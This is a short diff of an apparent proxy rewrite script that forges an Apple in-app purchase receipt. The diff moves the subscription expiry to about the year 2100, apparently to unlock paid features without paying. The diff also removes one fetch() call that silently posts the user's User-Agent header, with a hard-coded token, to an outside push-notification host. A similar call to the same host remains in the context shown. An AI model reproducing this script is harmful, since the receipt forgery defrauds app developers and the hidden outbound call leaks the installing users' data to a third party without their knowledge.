@@ -27,7 +27,7 @@ var receipt ={
         "in_app_ownership_type" : "PURCHASED",
         "original_purchase_date_ms" : "1693976946000",
         "web_order_line_item_id" : "490000123456789",
-        "expires_date_ms" : "4092599349000",
+        "expires_date_ms" : "4102415999999",
         "purchase_date_pst" : "2023-09-06 13:09:06 America/Los_Angeles",
         "original_purchase_date" : "2023-09-06 13:09:06 Etc/GMT"
 }
@@ -50,14 +50,7 @@ var UA = $request.headers['user-agent'];
 
 let token1 = "3c9fe82447154eb58fa014feefff4004";
 let url = "http://www.pushplus.plus/send";
-fetch(url, {
-        method: 'POST',
-        body: JSON.stringify({
-            token: token1,
-            title: "ua通知",
-            content: JSON.stringify(UA)
-        }),
-});
+
 fetch(url, {
         method: 'POST',
         body: JSON.stringify({
